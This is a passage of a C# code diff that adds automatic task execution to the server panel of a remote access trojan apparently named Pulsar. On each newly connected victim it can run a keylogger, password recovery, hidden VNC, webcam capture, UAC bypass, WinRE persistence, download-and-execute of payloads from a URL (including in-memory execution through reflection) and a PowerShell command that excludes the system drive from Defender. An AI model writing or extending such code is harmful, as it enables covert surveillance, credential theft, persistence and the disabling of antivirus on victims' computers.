+                NormalizeAutoTask(task);
+                return task;
+            }
+
+            var taskFromItem = new AutoTask
+            {
+                Title = item.Text ?? string.Empty,
+                Param1 = item.SubItems.Count > 1 ? item.SubItems[1].Text ?? string.Empty : string.Empty,
+                Param2 = item.SubItems.Count > 2 ? item.SubItems[2].Text ?? string.Empty : string.Empty
+            };
+
+            NormalizeAutoTask(taskFromItem);
+            return taskFromItem;
+        }
+
+        private void NormalizeAutoTask(AutoTask task)
+        {
+            if (task == null)
+            {
+                return;
+            }
+
+            task.Title ??= string.Empty;
+            task.Param1 ??= string.Empty;
+            task.Param2 ??= string.Empty;
+            task.Param3 ??= string.Empty;
+            task.Param4 ??= string.Empty;
+            task.Identifier ??= string.Empty;
+
+            if (string.IsNullOrWhiteSpace(task.Identifier) && _autoTaskBehaviorsByTitle.TryGetValue(task.Title, out var behavior))
+            {
+                task.Identifier = behavior.Id;
+                if (string.IsNullOrWhiteSpace(task.Title))
+                {
+                    task.Title = behavior.DisplayName;
                 }
             }
         }
 
+        private ListViewItem CreateAutoTaskListViewItem(AutoTask task)
+        {
+            var item = new ListViewItem(task.Title ?? string.Empty);
+            item.SubItems.Add(task.Param1 ?? string.Empty);
+            
+            string executionModeText = task.ExecutionMode == AutoTaskExecutionMode.OncePerClient ? "[Once]" : "[Every]";
+            string argumentsText = task.Param2 ?? string.Empty;
+            if (!string.IsNullOrEmpty(argumentsText))
+            {
+                argumentsText = $"{executionModeText} {argumentsText}";
+            }
+            else
+            {
+                argumentsText = executionModeText;
+            }
+            
+            item.SubItems.Add(argumentsText);
+            item.Tag = task;
+            return item;
+        }
+
+        private void InitializeAutoTaskBehaviors()
+        {
+            _autoTaskBehaviors.Clear();
+            _autoTaskBehaviorsByTitle.Clear();
+
+            // Administration
+            RegisterDefaultAutoTask(systemInformationToolStripMenuItem, systemInformationToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(fileManagerToolStripMenuItem, fileManagerToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(startupManagerToolStripMenuItem, startupManagerToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(taskManagerToolStripMenuItem, taskManagerToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(remoteShellToolStripMenuItem, remoteShellToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(connectionsToolStripMenuItem, connectionsToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(reverseProxyToolStripMenuItem, reverseProxyToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(registryEditorToolStripMenuItem, registryEditorToolStripMenuItem_Click);
+
+            RegisterAutoTaskBehavior(new AutoTaskBehavior(
+                localFileToolStripMenuItem.Name,
+                "Remote Execute (Local File)",
+                localFileToolStripMenuItem,
+                CreateRemoteExecuteLocalAutoTask,
+                (frm, client, task) => frm.ExecuteRemoteExecuteLocalAutoTask(client, task)));
+
+            RegisterAutoTaskBehavior(new AutoTaskBehavior(
+                webFileToolStripMenuItem.Name,
+                "Remote Execute (Web File)",
+                webFileToolStripMenuItem,
+                CreateRemoteExecuteWebAutoTask,
+                (frm, client, task) => frm.ExecuteRemoteExecuteWebAutoTask(client, task)));
+
+            RegisterDefaultAutoTask(shutdownToolStripMenuItem, shutdownToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(restartToolStripMenuItem, restartToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(standbyToolStripMenuItem, standbyToolStripMenuItem_Click);
+
+            // Monitoring
+            RegisterDefaultAutoTask(remoteDesktopToolStripMenuItem2, remoteDesktopToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(webcamToolStripMenuItem, webcamToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(remoteSystemAudioToolStripMenuItem, remoteSystemAudioToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(audioToolStripMenuItem, audioToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(hVNCToolStripMenuItem, hVNCToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(keyloggerToolStripMenuItem, keyloggerToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(passwordRecoveryToolStripMenuItem, passwordRecoveryToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(installVirtualMonitorToolStripMenuItem1, installVirtualMonitorToolStripMenuItem1_Click);
+            RegisterDefaultAutoTask(uninstallVirtualMonitorToolStripMenuItem, uninstallVirtualMonitorToolStripMenuItem_Click);
+
+            // User support
+            RegisterDefaultAutoTask(remoteChatToolStripMenuItem, remoteChatToolStripMenuItem_Click);
+            RegisterAutoTaskBehavior(new AutoTaskBehavior(
+                remoteScriptingToolStripMenuItem.Name,
+                remoteScriptingToolStripMenuItem.Text,
+                remoteScriptingToolStripMenuItem,
+                CreateRemoteScriptingAutoTask,
+                (frm, client, task) => frm.ExecuteMenuItemAutoTask(remoteScriptingToolStripMenuItem, remoteScriptingToolStripMenuItem_Click, client, task)));
+
+            RegisterAutoTaskBehavior(new AutoTaskBehavior(
+                showMessageboxToolStripMenuItem.Name,
+                showMessageboxToolStripMenuItem.Text,
+                showMessageboxToolStripMenuItem,
+                CreateShowMessageBoxAutoTask,
+                (frm, client, task) => frm.ExecuteMenuItemAutoTask(showMessageboxToolStripMenuItem, showMessageboxToolStripMenuItem_Click, client, task)));
+
+            RegisterAutoTaskBehavior(new AutoTaskBehavior(
+                visitWebsiteToolStripMenuItem.Name,
+                visitWebsiteToolStripMenuItem.Text,
+                visitWebsiteToolStripMenuItem,
+                CreateVisitWebsiteAutoTask,
+                (frm, client, task) => frm.ExecuteMenuItemAutoTask(visitWebsiteToolStripMenuItem, visitWebsiteToolStripMenuItem_Click, client, task)));
+
+            // Quick commands
+            RegisterDefaultAutoTask(addCDriveExceptionToolStripMenuItem, addCDriveExceptionToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(enableToolStripMenuItem, enableToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(disableTaskManagerToolStripMenuItem, disableTaskManagerToolStripMenuItem_Click);
+
+            // Fun stuff
+            RegisterDefaultAutoTask(bSODToolStripMenuItem, bSODToolStripMenuItem_Click);
+            RegisterAutoTaskBehavior(new AutoTaskBehavior(
+                cWToolStripMenuItem.Name,
+                cWToolStripMenuItem.Text,
+                cWToolStripMenuItem,
+                CreateChangeWallpaperAutoTask,
+                (frm, client, task) => frm.ExecuteMenuItemAutoTask(cWToolStripMenuItem, cWToolStripMenuItem_Click, client, task)));
+            RegisterDefaultAutoTask(swapMouseButtonsToolStripMenuItem, swapMouseButtonsToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(hideTaskBarToolStripMenuItem, hideTaskBarToolStripMenuItem_Click);
+
+            // Client management
+            RegisterDefaultAutoTask(elevateClientPermissionsToolStripMenuItem, elevateClientPermissionsToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(elevateToSystemToolStripMenuItem, elevateToSystemToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(deElevateFromSystemToolStripMenuItem, deElevateToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(uACBypassToolStripMenuItem, uACBypassToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(installWinresetSurvivalToolStripMenuItem, installWinresetSurvivalToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(removeWinresetSurvivalToolStripMenuItem, removeWinresetSurvivalToolStripMenuItem_Click);
+            RegisterAutoTaskBehavior(new AutoTaskBehavior(
+                winRECustomFileForSurvivalToolStripMenuItem.Name,
+                "WinRE Custom File",
+                winRECustomFileForSurvivalToolStripMenuItem,
+                CreateWinRECustomFileAutoTask,
+                (frm, client, task) => frm.ExecuteWinRECustomFileAutoTask(client, task)));
+            RegisterDefaultAutoTask(nicknameToolStripMenuItem, nicknameToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(blockIPToolStripMenuItem, blockIPToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(updateToolStripMenuItem, updateToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(reconnectToolStripMenuItem, reconnectToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(disconnectToolStripMenuItem, disconnectToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(uninstallToolStripMenuItem, uninstallToolStripMenuItem_Click);
+        }
+
+        private void RegisterDefaultAutoTask(ToolStripMenuItem menuItem, EventHandler handler, string displayName = null)
+        {
+            if (menuItem == null || handler == null)
+            {
+                return;
+            }
+
+            var behavior = new AutoTaskBehavior(
+                menuItem.Name,
+                displayName ?? menuItem.Text,
+                menuItem,
+                (frm, _) => new AutoTask { Title = displayName ?? menuItem.Text },
+                (frm, client, task) => frm.ExecuteMenuItemAutoTask(menuItem, handler, client, task));
+
+            RegisterAutoTaskBehavior(behavior);
+        }
+
+        private void RegisterAutoTaskBehavior(AutoTaskBehavior behavior)
+        {
+            if (behavior == null || string.IsNullOrWhiteSpace(behavior.Id))
+            {
+                return;
+            }
+
+            _autoTaskBehaviors[behavior.Id] = behavior;
+
+            if (!_autoTaskBehaviorsByTitle.ContainsKey(behavior.DisplayName))
+            {
+                _autoTaskBehaviorsByTitle[behavior.DisplayName] = behavior;
+            }
+
+            if (behavior.MenuItem != null && !_autoTaskBehaviorsByTitle.ContainsKey(behavior.MenuItem.Text))
+            {
+                _autoTaskBehaviorsByTitle[behavior.MenuItem.Text] = behavior;
+            }
+        }
+
+        private void BuildAutoTaskMenu()
+        {
+            if (addTaskToolStripMenuItem == null || contextMenuStrip == null)
+            {
+                return;
+            }
+
+            addTaskToolStripMenuItem.DropDownItems.Clear();
+
+            foreach (ToolStripItem item in contextMenuStrip.Items)
+            {
+                var cloned = CloneMenuItemForAutoTasks(item);
+                if (cloned != null)
+                {
+                    addTaskToolStripMenuItem.DropDownItems.Add(cloned);
+                }
+            }
+
+            TrimEmptySeparators(addTaskToolStripMenuItem.DropDownItems);
+        }
+
+        private ToolStripItem CloneMenuItemForAutoTasks(ToolStripItem item)
+        {
+            if (item is ToolStripSeparator)
+            {
+                return new ToolStripSeparator();
+            }
+
+            if (item is not ToolStripMenuItem menuItem)
+            {
+                return null;
+            }
+
+            var clone = new ToolStripMenuItem(menuItem.Text, menuItem.Image);
+
+            if (_autoTaskBehaviors.TryGetValue(menuItem.Name, out var behavior))
+            {
+                clone.Tag = behavior;
+                clone.Text = behavior.DisplayName;
+                clone.Click += AutoTaskMenuItem_Click;
+            }
+
+            foreach (ToolStripItem child in menuItem.DropDownItems)
+            {
+                var clonedChild = CloneMenuItemForAutoTasks(child);
+                if (clonedChild != null)
+                {
+                    clone.DropDownItems.Add(clonedChild);
+                }
+            }
+
+            TrimEmptySeparators(clone.DropDownItems);
+
+            if (clone.DropDownItems.Count == 0 && clone.Tag == null)
+            {
+                return null;
+            }
+
+            return clone;
+        }
+
+        private static void TrimEmptySeparators(ToolStripItemCollection items)
+        {
+            if (items == null || items.Count == 0)
+            {
+                return;
+            }
+
+            for (int i = items.Count - 1; i >= 0; i--)
+            {
+                if (items[i] is ToolStripSeparator)
+                {
+                    bool remove = i == 0 || i == items.Count - 1;
+                    if (!remove && items[i - 1] is ToolStripSeparator)
+                    {
+                        remove = true;
+                    }
+                    if (!remove && i + 1 < items.Count && items[i + 1] is ToolStripSeparator)
+                    {
+                        remove = true;
+                    }
+                    if (remove)
+                    {
+                        items.RemoveAt(i);
+                    }
+                }
+            }
+        }
+
+        private void AutoTaskMenuItem_Click(object sender, EventArgs e)
+        {
+            if (sender is not ToolStripMenuItem menuItem || menuItem.Tag is not AutoTaskBehavior behavior)
+            {
+                return;
+            }
+
+            var task = behavior.CreateTask(this);
+            if (task == null)
+            {
+                return;
+            }
+
+            task.Title = behavior.DisplayName;
+            task.Identifier = behavior.Id;
+
+            NormalizeAutoTask(task);
+            AddTask(task);
+        }
+
+        private bool TryExecuteAutoTask(AutoTask task, Client client)
+        {
+            if (task == null || client == null)
+            {
+                return false;
+            }
+
+            AutoTaskBehavior behavior = null;
+
+            if (!string.IsNullOrWhiteSpace(task.Identifier) && _autoTaskBehaviors.TryGetValue(task.Identifier, out behavior))
+            {
+                // behavior found by identifier
+            }
+            else if (!string.IsNullOrWhiteSpace(task.Title) && _autoTaskBehaviorsByTitle.TryGetValue(task.Title, out behavior))
+            {
+                task.Identifier = behavior.Id;
+            }
+
+            if (behavior == null)
+            {
+                return false;
+            }
+
+            behavior.Execute(this, client, task);
+            return true;
+        }
+
+        private void ExecuteMenuItemAutoTask(ToolStripMenuItem menuItem, EventHandler handler, Client client, AutoTask task)
+        {
+            if (menuItem == null || handler == null || client == null)
+            {
+                return;
+            }
+
+            var previousContext = _currentAutoTaskContext;
+            try
+            {
+                _currentAutoTaskContext = new AutoTaskExecutionContext(new[] { client }, task);
+                handler(menuItem, EventArgs.Empty);
+            }
+            finally
+            {
+                _currentAutoTaskContext = previousContext;
+            }
+        }
+
+        private void ExecuteLegacyAutoTask(AutoTask task, Client client)
+        {
+            if (task == null || client == null || string.IsNullOrWhiteSpace(task.Title))
+            {
+                return;
+            }
+
+            switch (task.Title)
+            {
+                case "Remote Execute":
+                    ExecuteRemoteExecuteLocalAutoTask(client, task);
+                    break;
+                case "Shell Command":
+                    if (!string.IsNullOrWhiteSpace(task.Param2))
+                    {
+                        string host = string.IsNullOrWhiteSpace(task.Param1) ? "cmd.exe" : task.Param1;
+                        client.Send(new DoSendQuickCommand { Host = host, Command = task.Param2 });
+                    }
+                    break;
+                case "Exclude System Drives":
+                    if (client.Value.AccountType == "Admin" || client.Value.AccountType == "System")
+                    {
+                        string powershellCode = "Add-MpPreference -ExclusionPath \"$([System.Environment]::GetEnvironmentVariable('SystemDrive'))\\\"\r\n";
+                        client.Send(new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" });
+                    }
+                    break;
+                case "Message Box":
+                    client.Send(new DoShowMessageBox
+                    {
+                        Caption = task.Param1 ?? string.Empty,
+                        Text = task.Param2 ?? string.Empty,
+                        Button = string.IsNullOrWhiteSpace(task.Param3) ? "OK" : task.Param3,
+                        Icon = string.IsNullOrWhiteSpace(task.Param4) ? "None" : task.Param4
+                    });
+                    break;
+                case "WinRE":
+                    if (client.Value.AccountType == "Admin" || client.Value.AccountType == "System")
+                    {
+                        client.Send(new DoAddWinREPersistence());
+                    }
+                    break;
+            }
+        }
+
+        private AutoTask CreateRemoteExecuteLocalAutoTask(FrmMain form, ToolStripMenuItem menuItem)
+        {
+            using var openFileDialog = new OpenFileDialog
+            {
+                Title = "Select file to execute on new clients",
+                Filter = "Executable Files (*.exe;*.bat;*.cmd;*.ps1)|*.exe;*.bat;*.cmd;*.ps1|All Files (*.*)|*.*",
+                Multiselect = false
+            };
+
+            if (openFileDialog.ShowDialog(form) != DialogResult.OK)
+            {
+                return null;
+            }
+
+            string path = openFileDialog.FileName;
+            return new AutoTask
+            {
+                Title = menuItem.Text,
+                Param1 = path,
+                Param2 = Path.GetFileName(path)
+            };
+        }
+
+        private void ExecuteRemoteExecuteLocalAutoTask(Client client, AutoTask task)
+        {
+            string filePath = task?.Param1 ?? string.Empty;
+            if (string.IsNullOrWhiteSpace(filePath))
+            {
+                return;
+            }
+
+            if (!File.Exists(filePath))
+            {
+                EventLog($"AutoTask Remote Execute skipped - file not found: {filePath}", "error");
+                return;
+            }
+
+            try
+            {
+                var fileHandler = new FileManagerHandler(client);
+                var taskHandler = new TaskManagerHandler(client);
+                fileHandler.BeginUploadFile(filePath, string.Empty);
+                taskHandler.StartProcess(filePath);
+            }
+            catch (Exception ex)
+            {
+                EventLog($"AutoTask Remote Execute failed for '{filePath}': {ex.Message}", "error");
+            }
+        }
+
+        private AutoTask CreateRemoteExecuteWebAutoTask(FrmMain form, ToolStripMenuItem menuItem)
+        {
+            string url = string.Empty;
+            if (InputBox.Show("Remote Execute (Web)", "Enter the URL to download and execute:", ref url) != DialogResult.OK)
+            {
+                return null;
+            }
+
+            url = (url ?? string.Empty).Trim();
+            if (string.IsNullOrWhiteSpace(url))
+            {
+                MessageBox.Show(form, "URL cannot be empty.", "Remote Execute", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return null;
+            }
+
+            var updateResult = MessageBox.Show(form, "Treat this payload as an update?", "Remote Execute", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question);
+            if (updateResult == DialogResult.Cancel)
+            {
+                return null;
+            }
+
+            bool isUpdate = updateResult == DialogResult.Yes;
+
+            var reflectionResult = MessageBox.Show(form, "Execute in memory using .NET reflection (for managed payloads)?", "Remote Execute", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question);
+            if (reflectionResult == DialogResult.Cancel)
+            {
+                return null;
+            }
+
+            bool executeInMemory = reflectionResult == DialogResult.Yes;
+
+            if (!url.StartsWith("http", StringComparison.OrdinalIgnoreCase))
+            {
+                url = "http://" + url;
+            }
+
+            return new AutoTask
+            {
+                Title = menuItem.Text,
+                Param1 = url,
+                Param2 = isUpdate ? "Update Mode" : "Execute",
+                Param3 = isUpdate.ToString(),
+                Param4 = executeInMemory.ToString()
+            };
+        }
+
+        private void ExecuteRemoteExecuteWebAutoTask(Client client, AutoTask task)
+        {
+            string url = task?.Param1 ?? string.Empty;
+            if (string.IsNullOrWhiteSpace(url))
+            {
+                return;
+            }
+
+            if (!url.StartsWith("http", StringComparison.OrdinalIgnoreCase))
+            {
+                url = "http://" + url;
+            }
+
+            bool isUpdate = bool.TryParse(task?.Param3, out var update) && update;
+            bool executeInMemory = bool.TryParse(task?.Param4, out var reflection) && reflection;
+
+            try
+            {
+                var taskHandler = new TaskManagerHandler(client);
+                taskHandler.StartProcessFromWeb(url, isUpdate, executeInMemory);
+            }
+            catch (Exception ex)
+            {
+                EventLog($"AutoTask Remote Execute (web) failed for '{url}': {ex.Message}", "error");
+            }
+        }
+
+        private AutoTask CreateRemoteScriptingAutoTask(FrmMain form, ToolStripMenuItem menuItem)
+        {
+            using (var dialog = new FrmRemoteScripting(0))
+            {
+                if (dialog.ShowDialog(form) != DialogResult.OK)
+                {
+                    return null;
+                }
+
+                return new AutoTask
+                {
+                    Title = menuItem.Text,
+                    Param1 = dialog.Lang ?? string.Empty,
+                    Param2 = dialog.Hidden ? "Hidden" : "Visible",
+                    Param3 = dialog.Script ?? string.Empty,
+                    Param4 = dialog.Hidden.ToString()
+                };
+            }
+        }
+
+        private AutoTask CreateShowMessageBoxAutoTask(FrmMain form, ToolStripMenuItem menuItem)
+        {
+            using (var dialog = new FrmShowMessagebox(0))
+            {
+                if (dialog.ShowDialog(form) != DialogResult.OK)
+                {
+                    return null;
+                }
+
+                return new AutoTask
+                {
+                    Title = menuItem.Text,
+                    Param1 = dialog.MsgBoxCaption ?? string.Empty,
+                    Param2 = dialog.MsgBoxText ?? string.Empty,
+                    Param3 = dialog.MsgBoxButton ?? "OK",
+                    Param4 = dialog.MsgBoxIcon ?? "None"
+                };
+            }
+        }
+
+        private AutoTask CreateVisitWebsiteAutoTask(FrmMain form, ToolStripMenuItem menuItem)
+        {
+            using (var dialog = new FrmVisitWebsite(0))
+            {
+                if (dialog.ShowDialog(form) != DialogResult.OK || string.IsNullOrWhiteSpace(dialog.Url))
+                {
+                    return null;
+                }
+
+                return new AutoTask
+                {
+                    Title = menuItem.Text,
+                    Param1 = dialog.Url ?? string.Empty,
+                    Param2 = dialog.Hidden ? "Hidden" : "Visible",
+                    Param3 = dialog.Hidden.ToString()
+                };
+            }
+        }
+
+        private AutoTask CreateChangeWallpaperAutoTask(FrmMain form, ToolStripMenuItem menuItem)
+        {
+            using (var openFileDialog = new OpenFileDialog
+            {
+                Title = "Select wallpaper image",
+                Filter = "Image Files|*.jpg;*.jpeg;*.png;*.bmp;*.gif|All Files (*.*)|*.*",
+                Multiselect = false
+            })
+            {
+                if (openFileDialog.ShowDialog(form) != DialogResult.OK)
+                {
+                    return null;
+                }
+
+                string path = openFileDialog.FileName;
+                return new AutoTask
+                {
+                    Title = menuItem.Text,
+                    Param1 = path,
+                    Param2 = Path.GetFileName(path)
+                };
+            }
+        }
+
+        private AutoTask CreateWinRECustomFileAutoTask(FrmMain form, ToolStripMenuItem menuItem)
+        {
+            string program = string.Empty;
+            if (InputBox.Show("WinRE Custom File", "Enter the program path to execute from WinRE:", ref program) != DialogResult.OK)
+            {
+                return null;
+            }
+
+            program = (program ?? string.Empty).Trim();
+            if (string.IsNullOrWhiteSpace(program))
+            {
+                return null;
+            }
+
+            string arguments = string.Empty;
+            InputBox.Show("WinRE Custom File", "Enter command-line arguments (optional):", ref arguments);
+
+            return new AutoTask
+            {
+                Title = "WinRE Custom File",
+                Param1 = program,
+                Param2 = (arguments ?? string.Empty).Trim()
+            };
+        }
+
+        private void ExecuteWinRECustomFileAutoTask(Client client, AutoTask task)
+        {
+            if (client?.Value == null)
+            {
+                return;
+            }
+
+            bool isClientAdmin = client.Value.AccountType == "Admin" || client.Value.AccountType == "System";
+            if (!isClientAdmin)
+            {
+                if (_currentAutoTaskContext == null)
+                {
+                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+                else
+                {
+                    EventLog($"Skipping WinRE custom file task for {client.Value.Username} - client not elevated.", "warn");
+                }
+                return;
+            }
+
+            client.Send(new AddCustomFileWinRE
+            {
+                Path = task?.Param1 ?? string.Empty,
+                Arguments = task?.Param2 ?? string.Empty
+            });
+        }
+
         private void winREToolStripMenuItem1_Click(object sender, EventArgs e)
         {
-            AddTask("WinRE", "", "");
+            AddTask("WinRE", string.Empty, string.Empty);
+        }
+
+        private sealed class AutoTaskExecutionContext
+        {
+            public AutoTaskExecutionContext(Client[] clients, AutoTask task)
+            {
+                Clients = clients ?? Array.Empty<Client>();
+                Task = task;
+            }
+
+            public Client[] Clients { get; }
+
+            public AutoTask Task { get; }
+        }
+
+        private sealed class AutoTaskBehavior
+        {
+            private readonly Func<FrmMain, ToolStripMenuItem, AutoTask> _createTask;
+            private readonly Action<FrmMain, Client, AutoTask> _executeTask;
+
+            public AutoTaskBehavior(string id, string displayName, ToolStripMenuItem menuItem, Func<FrmMain, ToolStripMenuItem, AutoTask> createTask, Action<FrmMain, Client, AutoTask> executeTask)
+            {
+                Id = id ?? string.Empty;
+                DisplayName = displayName ?? string.Empty;
+                MenuItem = menuItem;
+                _createTask = createTask ?? ((form, item) => null);
+                _executeTask = executeTask ?? ((form, client, task) => { });
+            }
+
+            public string Id { get; }
+
+            public string DisplayName { get; }
+
+            public ToolStripMenuItem MenuItem { get; }
+
+            public AutoTask CreateTask(FrmMain form)
+            {
+                return _createTask(form, MenuItem);
+            }
+
+            public void Execute(FrmMain form, Client client, AutoTask task)
+            {
+                _executeTask(form, client, task);
+            }
         }
 
         #region "Search Functionality"
@@ -3641,9 +4830,13 @@ namespace Pulsar.Server.Forms
 
     public class AutoTask
     {
-        public string Title { get; set; }
-        public string Param1 { get; set; }
-        public string Param2 { get; set; }
+        public string Title { get; set; } = string.Empty;
+        public string Param1 { get; set; } = string.Empty;
+        public string Param2 { get; set; } = string.Empty;
+        public string Param3 { get; set; } = string.Empty;
+        public string Param4 { get; set; } = string.Empty;
+        public string Identifier { get; set; } = string.Empty;
+        public AutoTaskExecutionMode ExecutionMode { get; set; } = AutoTaskExecutionMode.OncePerClient;
     }
 
     public class ClientInfo
